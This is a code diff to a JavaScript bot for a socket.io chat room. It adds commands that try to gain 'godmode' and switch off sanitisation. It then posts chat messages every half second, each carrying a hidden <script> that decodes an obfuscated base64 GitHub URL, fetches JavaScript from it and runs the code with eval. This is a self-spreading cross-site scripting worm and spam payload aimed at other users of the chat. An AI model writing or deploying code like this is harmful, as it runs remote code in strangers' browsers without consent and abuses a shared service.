@@ -1,4 +1,5 @@
-alert("2026 is coming")
+socket.emit('command', { list: ['godmode'] });
+socket.emit('command', { list: ['sanitize', 'off'] });
 setInterval(() => {
     const socketb = io("//");
     socketb.emit("client", "MAIN");
@@ -12,15 +13,17 @@ setInterval(() => {
     socketb.emit("command", {
         list: ["color"]
     });
+    socketb.emit('command', { list: ['godmode'] });
+    socketb.emit('command', { list: ['sanitize', 'off'] });
     setInterval(() => {
     socketb.emit("talk", {
-        text: "SPREAD THE WORD, THE 2026 IS COMING"
+        text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'COUGHSPR'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
     });
     },500)
 }, 50)
 setInterval(() => {
 socket.emit("talk", {
-    text: "SPREAD THE WORD, THE 2026 IS COMING"
+    text: "SPREAD THE WORD, THE 2026 IS COMING. <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'COUGHSPR'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
 });
 socket.emit('command',{
   list: ['name', $("#login_name").val() + ' #RAS2026']
